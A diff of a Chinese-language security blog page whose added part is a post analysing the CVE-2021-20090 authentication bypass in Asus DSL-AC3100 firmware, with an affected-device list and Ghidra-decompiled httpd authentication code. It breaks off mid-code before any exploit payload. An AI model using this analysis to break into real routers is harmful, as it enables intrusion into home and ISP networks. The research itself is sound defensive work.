@@ -1,276 +1,1073 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="renderer" content="webkit">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
-     <link rel="shortcut icon" href= /img/favicon.ico >
-    <title>
-        Tig3rHu&#39;s Blog
-    </title>
-    <meta name="description" content= Hello World >
-    <meta name="keywords" content= HigerHu,vulnerability,security,cyber >
-    
-<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
-
-    
-<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
-
-    
+  <meta charset="utf-8">
+  
+  
+  <title>Tig3rHu&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Tig3rHu&#39;s Blog">
+<meta property="og:url" content="https://tig3rhu.github.io/page/2/index.html">
+<meta property="og:site_name" content="Tig3rHu&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Tig3rHu">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Tig3rHu's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
 <link rel="stylesheet" href="/css/style.css">
 
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
 <meta name="generator" content="Hexo 7.0.0"></head>
-<body id="bodyx">
-    <div class="hd logodiv">
-    <img src="/img/heard.png" class="logopng" alt="logo">
-    <p class="logot">
-         Tig3rHu&#39;s Blog 
-         <span class="logo_2"></span>
-        <h3 class="words" style="font-weight: bold;font-family: Georgia;"> 
-            我们曾仰望星空，对自己在宇宙中的位置产生好奇，现在我们只是低头担忧自己在泥土中的位置 :) 
-        </h3>
-    </p>
-</div>
 
-
-<div class="hd">
-    <ol class="breadcrumb">
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Tig3rHu&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
         
-            <li><a class="ba" href="/about">关于我👀</a></li>
+          <a class="main-nav-link" href="/">Home</a>
         
-            <li><a class="ba" href="https://tig3rhu.github.io/">访问主站🎉</a></li>
+          <a class="main-nav-link" href="/archives">Archives</a>
         
-            <li><a class="ba" target="_blank" rel="noopener" href="https://github.com/Tig3rHu">GitHub🐒</a></li>
+      </nav>
+      <nav id="sub-nav">
         
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tig3rhu.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
 
-            
-<script src="/libs/jquery.min.js"></script>
-
-            
-<script src="/js/search.js"></script>
-
-            
-                <form class="site-search-form">
-                    <i class="fa fa-search" id="search-logo"><input type="text" id="local-search-input" class="st-search-input" /></i>
-                </form>
-                <div id="local-search-result" class="local-search-result-cls"></div>
-            
-            <script type="text/javascript" id="local.search.active">
-                var inputArea       = document.querySelector("#local-search-input");
-                var getSearchFile = function(){
-                    var path = "/search.xml";
-                    searchFunc(path, 'local-search-input', 'local-search-result');
-                }
-                inputArea.onfocus = function(){ getSearchFile() }
-
-                var $resetButton = $("#search-form .fa-times");
-                var $resultArea = $("#local-search-result");
-
-                inputArea.oninput = function(){ $resetButton.show(); }
-                resetSearch = function(){
-                    $resultArea.html("");
-                    document.querySelector("#search-form").reset();
-                    $resetButton.hide();
-                    $(".no-result").hide();
-                }
-                inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
-                //No search result
-                $resultArea.bind("DOMNodeRemoved DOMNodeInserted", function(e) {
-                    if (!$(e.target).text()) {
-                        $(".no-result").show(100);
-                    } else {
-                        $(".no-result").hide();
-                    }
-                })
-            </script>
-
-    </ol>
-    <hr>
-</div>
-<div class="hd">
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-CVE-2021-20090(华硕DSL-AC3100)身份验证绕过漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2023-12-16T12:46:07.982Z" itemprop="datePublished">2023-12-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
     
     
+      <header class="article-header">
         
-        
-            <div class="titlex">
-                <p><span class="jing"></span><span style="color: #6d9ee7;"> </span> 
-                 2023年 🕛
-                </p>
-            </div>
-            
-        
-        <a class="flink" href="/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-            <div class="list">
-                <div class="postname">
-                    CVE-2021-20090 身份验证绕过漏洞分析
-                </div>
-                <div class="posttime">
-                    December 16th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-            <div class="list">
-                <div class="postname">
-                    NetGear__DNG2200v1系列漏洞分析
-                </div>
-                <div class="posttime">
-                    December 16th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">
-            <div class="list">
-                <div class="postname">
-                    Linksys EA6100 固件解密过程
-                </div>
-                <div class="posttime">
-                    December 16th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-            <div class="list">
-                <div class="postname">
-                    Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用
-                </div>
-                <div class="posttime">
-                    December 15th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-            <div class="list">
-                <div class="postname">
-                    TP-Link WR841n 路由器多个缓冲区溢出漏洞复现
-                </div>
-                <div class="posttime">
-                    December 15th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">
-            <div class="list">
-                <div class="postname">
-                    USG310_4.70_固件解密分析
-                </div>
-                <div class="posttime">
-                    December 15th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
-            <div class="list">
-                <div class="postname">
-                    github 博客搭建记录
-                </div>
-                <div class="posttime">
-                    December 15th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-            <div class="list">
-                <div class="postname">
-                    Cisco Rv160 远程命令执行漏洞分析
-                </div>
-                <div class="posttime">
-                    December 15th
-                </div>
-            </div>
-        </a>
-    
-        
-        
-        <a class="flink" href="/2023/12/15/hello-world/">
-            <div class="list">
-                <div class="postname">
-                    Hello World
-                </div>
-                <div class="posttime">
-                    December 15th
-                </div>
-            </div>
-        </a>
-    
-</div>
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2021-20090 身份验证绕过漏洞分析</a>
+    </h1>
+  
 
-    <div class="footer" id="footer">
-    <p><h4>Copyright © 2023 | Author: HigerHu | </a></h4>
+      </header>
     
-        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
-        <span class="post-meta-divider">|</span>
-        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
-    
-    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
-        <input type="checkbox" name="switch" id="update_style">
-        <span class="el-switch-style"></span>
-    </label>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近Tenable 披露了Arcadyna 网络设备身份验证绕过漏洞，并且很多的厂商都采用产生漏洞的组件，由于Arcadyan 设备固件厂商并没有开源出来，在官网支持里面下载的文件是window和linux 下和设备连接的客户端软件，无法对漏洞点开展分析，这里我们使用同样受影响的华硕产品DSL-AC3100 的固件来进行设备分析。并且复现在网络设备中网络检测ping 功能的远程命令执行漏洞，从而开启设备telentd。</p>
+<p>影响范围</p>
+<p>ADB ADSL wireless IAD router 1.26S-R-3P<br>Arcadyan ARV7519 00.96.00.96.617ES<br>Arcadyan VRV9517 6.00.17 build04<br>Arcadyan VGV7519 3.01.116<br>Arcadyan VRV9518 1.01.00 build44<br>ASMAX BBR-4MG &#x2F; SMC7908 ADSL 0.08<br>ASUS DSL-AC88U (Arc VRV9517) 1.10.05 build502<br>ASUS DSL-AC87VG (Arc VRV9510) 1.05.18 build305<br>ASUS DSL-AC3100 1.10.05 build503<br>ASUS DSL-AC68VG 5.00.08 build272<br>Beeline Smart Box Flash 1.00.13_beta4<br>British Telecom WE410443-SA 1.02.12 build02<br>Buffalo WSR-2533DHPL2 1.02<br>Buffalo WSR-2533DHP3 1.24<br>Buffalo BBR-4HG 　<br>Buffalo BBR-4MG 2.08 Release 0002<br>Buffalo WSR-3200AX4S 1.1<br>Buffalo WSR-1166DHP2 1.15<br>Buffalo WXR-5700AX7S 1.11<br>Deutsche Telekom Speedport Smart 3 010137.4.8.001.0<br>HughesNet HT2000W 0.10.10<br>KPN ExperiaBox V10A (Arcadyan VRV9517) 5.00.48 build453<br>KPN VGV7519 3.01.116<br>O2 HomeBox 6441 1.01.36<br>Orange LiveBox Fibra (PRV3399) 00.96.00.96.617ES<br>Skinny Smart Modem (Arcadyan VRV9517) 6.00.16 build01<br>SparkNZ Smart Modem (Arcadyan VRV9517) 6.00.17 build04<br>Telecom (Argentina) Arcadyan VRV9518VAC23-A-OS-AM 1.01.00 build44<br>TelMex PRV33AC 1.31.005.0012<br>TelMex VRV7006 　<br>Telstra Smart Modem Gen 2 (LH1000) 0.13.01r<br>Telus WiFi Hub (PRV65B444A-S-TS) v3.00.20<br>Telus NH20A 1.00.10debug build06<br>Verizon Fios G3100 1.5.0.10<br>Vodafone EasyBox 904 4.16<br>Vodafone EasyBox 903 30.05.714<br>Vodafone EasyBox 802 20.02.226</p>
+<h2 id="0x02-华硕DSL-AC3100-固件"><a href="#0x02-华硕DSL-AC3100-固件" class="headerlink" title="0x02 华硕DSL-AC3100 固件"></a>0x02 华硕DSL-AC3100 固件</h2><p>我们从华硕的官网中下载固件。</p>
+<p>设备名称： DSL-AC3100</p>
+<p>固件版本： DSL-AC3100_v1.10.05_build503</p>
+<h2 id="0x03-身份验证绕过漏洞分析"><a href="#0x03-身份验证绕过漏洞分析" class="headerlink" title="0x03 身份验证绕过漏洞分析"></a>0x03 身份验证绕过漏洞分析</h2><h4 id="提取固件包"><a href="#提取固件包" class="headerlink" title="提取固件包"></a>提取固件包</h4><p>从华硕的官网瞎下载到固件包DSL-AC3100_v1.10.05_build503.w ，这是一个是用.w 为后缀的固件文件，使用binwalk 可以提取出来。根据漏洞信息，可以确定这是一个在http服务中存在的漏洞，可以确定到httpd 文件，本固件的httpd 文件在 &#x2F;usr&#x2F;sbin&#x2F;httpd 中。</p>
+<p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815164522715.png" alt="image-20210815164522715"></p>
+<h4 id="httpd-二进制文件分析"><a href="#httpd-二进制文件分析" class="headerlink" title="httpd 二进制文件分析"></a>httpd 二进制文件分析</h4><p>在ghidra 导入httpd 文件，自动对文件进行分析，识别文件的各种函数。</p>
+<p>由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些，在ghidra对httpd文件中的字符串进行搜寻，根据字符串 “check_auth” ，定位到函数 FUN_0001d0c0()，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">undefined4 FUN_0001d0c0(int iParm1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  int iVar3;</span><br><span class="line">  undefined4 local_52c;</span><br><span class="line">  undefined4 local_528;</span><br><span class="line">  undefined4 local_524;</span><br><span class="line">  undefined4 uStack1312;</span><br><span class="line">  undefined4 local_51c;</span><br><span class="line">  char acStack1304 [1024];</span><br><span class="line">  char acStack280 [260];</span><br><span class="line">  </span><br><span class="line">  memset(acStack280,0,0x100);</span><br><span class="line">  memset(acStack1304,0,0x400);</span><br><span class="line">  local_52c = 0;</span><br><span class="line">  local_528 = 0;</span><br><span class="line">  local_524 = 0;</span><br><span class="line">  uStack1312 = 0;</span><br><span class="line">  local_51c = 0;</span><br><span class="line">  iVar1 = FUN_00017df0();</span><br><span class="line">  if (iVar1 == -1) &#123;</span><br><span class="line">    uVar2 = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    iVar3 = mapi_ccfg_match_str(iVar1,&quot;ARC_SYS_LogEnable&quot;,&amp;DAT_00046b48);</span><br><span class="line">    iVar1 = mapi_ccfg_match_str(iVar1,&quot;ARC_SYS_MPTEST&quot;,&amp;DAT_00046b48);</span><br><span class="line">    if (iVar1 == 0) &#123;</span><br><span class="line">      if (iVar3 != 0) &#123;</span><br><span class="line">        iVar3 = 1;</span><br><span class="line">      &#125;</span><br><span class="line">      if (iVar3 != 0) &#123;</span><br><span class="line">        FUN_00017738(iParm1 + 0x76f0,&amp;local_52c);</span><br><span class="line">      &#125;</span><br><span class="line">      if (*(int *)(iParm1 + 0x774c) == 0) &#123;</span><br><span class="line">        uVar2 = FUN_0001b6f4(iParm1 + 0x771e,*(undefined4 *)(iParm1 + 0x76ec));</span><br><span class="line">        FUN_0001b8c8(iParm1,uVar2);</span><br><span class="line">      &#125;</span><br><span class="line">      iVar1 = FUN_0001ce8c(*(undefined4 *)(iParm1 + 0x774c),*(undefined4 *)(iParm1 + 0x76b0),</span><br><span class="line">                           *(undefined4 *)(iParm1 + 0x76b4),*(undefined4 *)(iParm1 + 0x76b8),</span><br><span class="line">                           *(undefined4 *)(iParm1 + 0x76bc),*(undefined4 *)(iParm1 + 0x76c0),</span><br><span class="line">                           *(undefined4 *)(iParm1 + 0x76c4),*(undefined4 *)(iParm1 + 0x76c8),</span><br><span class="line">                           *(undefined4 *)(iParm1 + 0x7b34));</span><br><span class="line">      if (iVar1 == 1) &#123;</span><br><span class="line">        printf(&quot;[%s] %s login time out, reauth\n&quot;,&quot;check_auth&quot;,iParm1 + 0x76f0);</span><br><span class="line">        FUN_00039088(1);</span><br><span class="line">        snprintf(acStack1304,0x400,&quot;Location: /relogin.htm\n\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">        if (iVar1 == 2) &#123;</span><br><span class="line">          printf(&quot;[%s] new user %s(%s) comes to login, check user and auth\n&quot;,&quot;check_auth&quot;,</span><br><span class="line">                 iParm1 + 0x76f0,iParm1 + 0x4c);</span><br><span class="line">          snprintf(acStack1304,0x400,&quot;Location: /relogin.htm\n\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">          if (iVar1 == 0) &#123;</span><br><span class="line">            printf(&quot;[%s] %s has already granted, pass\n&quot;,&quot;check_auth&quot;,iParm1 + 0x76f0);</span><br><span class="line">            return 0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if (iVar3 != 0) &#123;</span><br><span class="line">        snprintf(acStack280,0x100,&quot;User from %s(%s) authentication fail.&quot;,&amp;local_52c,iParm1 +0x76f0</span><br><span class="line">                );</span><br><span class="line">        append_to_file(&quot;/tmp/security_log.txt&quot;,acStack280);</span><br><span class="line">      &#125;</span><br><span class="line">      FUN_00015338(iParm1,acStack1304);</span><br><span class="line">      uVar2 = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      uVar2 = 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    <!--         <script type="text/javascript">
-    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
-    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
-    </script> -->
-</p>
-</div>
+<p>根据函数代码的一些细节，可以看出这个函数检查认认证是否符合的功能函数，其中FUN_0001ce8c 函数的返回值iVar1，在函数中 iVar1 的值为2 时，说明是新用户登录，需要检查用户名和验证。iVar1 的值为 0 的时候，则显示验证通过。iVar1 的值为 1 的时候，则表示说明验证超时，并且重新返回到登录界面。</p>
+<p>接下来，查看FUN_0001d0c0() 函数在FUN_0001d578() 中被引用。而FUN_0001d0c0() 函数就是漏洞的evaluate_access() 函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// evaluate_access()</span><br><span class="line">undefined4 FUN_0001d578(undefined4 uParm1,undefined4 uParm2,int iParm3)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  if (iParm3 == 0) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_0001d2e0(iParm3);</span><br><span class="line">  if (iVar1 != 0) &#123;</span><br><span class="line">    if (*(int *)(iParm3 + 0x76a8) != 0) &#123;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = FUN_0001d0c0(iParm3); </span><br><span class="line">    return uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00014510(iParm3,0x193,&quot;Unauthorized.&quot;);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<input type="hidden" id="web_style" value="black">
-<input type="hidden" id="valine_appid" value="">
-<input type="hidden" id="valine_appKey" value="">
+<p>FUN_0001d578() 函数中的 FUN_0001d2e0() 是使用正则表达式来校验URL中的IP，端口是否符合规范。以及FUN_0001d0c0() 函数也在其中，因此这个函数是httpd 中来做身份验证的函数，也就是漏洞分析中的evaluate_access()。</p>
+<p>接下来我们来查看调用evaluate_access() 函数的地方，真正的漏洞点在这个函数，我们来看漏洞点是如何绕过身份验证的。我们来到了FUN_00015058函数，这就是process_request 的函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">void FUN_00015058(int iParm1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 uVar1;</span><br><span class="line">  char *pcVar2;</span><br><span class="line">  char *__src;</span><br><span class="line">  int iVar3;</span><br><span class="line">  char *__dest;</span><br><span class="line">  </span><br><span class="line">  iVar3 = iParm1 + 0xd5;</span><br><span class="line">  uVar1 = FUN_00016a84(iVar3,0xd);</span><br><span class="line">  *(undefined4 *)(iParm1 + 0x27f0) = uVar1;</span><br><span class="line">  *(undefined4 *)(iParm1 + 0x76a4) = 0xffffffff;</span><br><span class="line">  *(undefined4 *)(iParm1 + 0x76ac) = 0xffffffff;</span><br><span class="line">  __src = (char *)FUN_00016a84(iVar3,0x20);</span><br><span class="line">  *(int *)(iParm1 + 0x7b18) = iVar3;</span><br><span class="line">  pcVar2 = (char *)FUN_00016a84(__src,0x20);</span><br><span class="line">  uVar1 = FUN_00016a84(__src,0x3f);</span><br><span class="line">  *(undefined4 *)(iParm1 + 0x7b14) = uVar1;</span><br><span class="line">  __dest = (char *)(iParm1 + 0x7994);</span><br><span class="line">  strncpy(__dest,__src,0xff);</span><br><span class="line">  *(undefined *)(iParm1 + 0x7a93) = 0;</span><br><span class="line">  FUN_00016e3c(__dest);</span><br><span class="line">  printf(&quot;[%s] url=[%s], args=[%s], method=[%s]\n&quot;,&quot;process_request&quot;,__dest,</span><br><span class="line">         *(undefined4 *)(iParm1 + 0x7b14),*(undefined4 *)(iParm1 + 0x7b18));</span><br><span class="line">  iVar3 = FUN_00018c70(iParm1);</span><br><span class="line">  if (iVar3 &lt; 0) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  if (*pcVar2 == &#x27;\0&#x27;) &#123;</span><br><span class="line">    *(undefined4 *)(iParm1 + 0x7988) = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    *(undefined4 *)(iParm1 + 0x7988) = 0;</span><br><span class="line">    iVar3 = FUN_00018cb8(iParm1);</span><br><span class="line">    if (iVar3 &lt; 0) &#123;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar3 = strncasecmp(*(char **)(iParm1 + 0x7620),&quot;multipart/form-data&quot;,0x13);</span><br><span class="line">    if ((((iVar3 != 0) &amp;&amp; (*(char **)(iParm1 + 0x7b24) != (char *)0x0)) &amp;&amp;</span><br><span class="line">        (__src = strcasestr(*(char **)(iParm1 + 0x7b24),&quot;FirmwareUpload&quot;), __src == (char *)0x0))&amp;&amp;</span><br><span class="line">       (0 &lt; (int)(*(int *)(iParm1 + 0x7984) + (uint)(64000 &lt; *(uint *)(iParm1 + 0x7980))))) &#123;</span><br><span class="line">      FUN_0000bef4(iParm1,*(undefined4 *)(iParm1 + 0xc));</span><br><span class="line">      FUN_00014510(iParm1,0x193,&quot;The Content-length is extreme large!&quot;);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar1 = FUN_0000deb0(__dest);</span><br><span class="line">  *(undefined4 *)(iParm1 + 0x76a8) = uVar1;</span><br><span class="line">  // evaluate_access()</span><br><span class="line">  if (((*(code **)(PTR_PTR_DAT_00054fac + 0x14) == (code *)0x0) ||</span><br><span class="line">      (iVar3 = (**(code **)(PTR_PTR_DAT_00054fac + 0x14))(iParm1), iVar3 != 2)) &amp;&amp;</span><br><span class="line">     ((*(int *)(iParm1 + 0x76a8) != 0 || (iVar3 = FUN_0001d578(__dest,0,iParm1), iVar3 == 0)))) &#123;</span><br><span class="line">    *(undefined4 *)(iParm1 + 0x798c) = 0;</span><br><span class="line">    __src = *(char **)(iParm1 + 0x7b18);</span><br><span class="line">    iVar3 = strcmp(__src,&quot;HEAD&quot;);</span><br><span class="line">    if (iVar3 == 0) &#123;</span><br><span class="line">      *(undefined4 *)(iParm1 + 0x798c) = 1;</span><br><span class="line">      if (*(int *)(iParm1 + 0x7988) == 0) &#123;</span><br><span class="line">        FUN_0000eb98(iParm1);</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">        *(undefined4 *)(iParm1 + 0x798c) = 0;</span><br><span class="line">        FUN_00014510(iParm1,400,&quot;Invalid HTTP/0.9 method.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      iVar3 = strcmp(__src,&quot;GET&quot;);</span><br><span class="line">      if (iVar3 == 0) &#123;</span><br><span class="line">        FUN_0000eb98(iParm1);</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">        iVar3 = strcmp(__src,&quot;POST&quot;);</span><br><span class="line">        if (iVar3 == 0) &#123;</span><br><span class="line">          FUN_00014c30(iParm1);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">          